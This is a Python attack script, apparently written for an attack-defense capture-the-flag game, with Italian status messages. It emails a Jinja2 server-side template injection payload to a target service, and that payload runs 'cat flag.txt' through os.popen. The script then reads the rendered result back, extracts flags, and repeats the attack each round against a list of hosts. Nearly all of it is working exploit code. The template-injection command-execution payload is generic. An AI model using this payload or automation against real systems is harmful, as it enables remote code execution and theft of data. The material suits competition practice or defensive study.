import requests,time,json,rstr,re;
from datetime import datetime;
import smtplib
from base58 import b58decode, b58encode

ips = ["localhost"]
round_time = 120

for i in range(101,111):
	if i==108:
		continue
#	ips.append(f"192.168.20.{i}")

def submit(flags):
	data = json.dumps({"flags":flags, "team_token":"0XbvSw51te"})
	for i in range(30):
		try:
			x = requests.post('http://10.1.3.10:5000/submit', data=data, timeout=2)
			print("Submit eseguita.\n")
			return
		except Exception as e:
			print(f"!!  Submit non riuscita: Eccezione {e}\n")
			time.sleep(2)
			continue
def attack(ip):
	newFlags = []
	request = requests.get(f"http://{ip}:5000/", timeout = 5)
	
	email = re.findall("[\w\.-]+@[\w\.-]+", request.text)[0]
	username = email.split("@")[0]
	hostname = email.split("@")[1]
	address = f"{username}@{hostname}"
	
	s = smtplib.SMTP(ip, 8025)
	message = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
	s.sendmail("example@example.com", email, msg=message)
	
	get_email = requests.get(f"http://{ip}:5000/{b58encode(address).decode()}", timeout = 5)
	flag = re.findall("[a-zA-Z]{31}=", get_email.text)
	print(get_email.text)
	newFlags.extend(flag)
	if(len(newFlags) == 0):
		raise Exception()
	return newFlags

def main():
	round = 0
	while True :
		flags = []
		print(f"Inizio round {round} - {datetime.now().strftime('%H:%M:%S')}\n")
		for ip in ips:
		        newFlags = []
		        try:
		        	newFlags = attack(ip)
		        except Exception as e:
		       		print(f"-	Eccezione catturata: l'indirizzo {ip} si Ã¨ difeso\n")
		       		continue

		        print(f"-       Catturate {len(newFlags)} nuove flag dall'ip: {ip}\n{newFlags}\n")
		        flags.extend(newFlags)

		print(f"Fine round {round} - Catturate {len(flags)} flag totali - {datetime.now().strftime('%H:%M:%S')}\n")
		#submit(flags)
		round+=1
		time.sleep(round_time)

main()
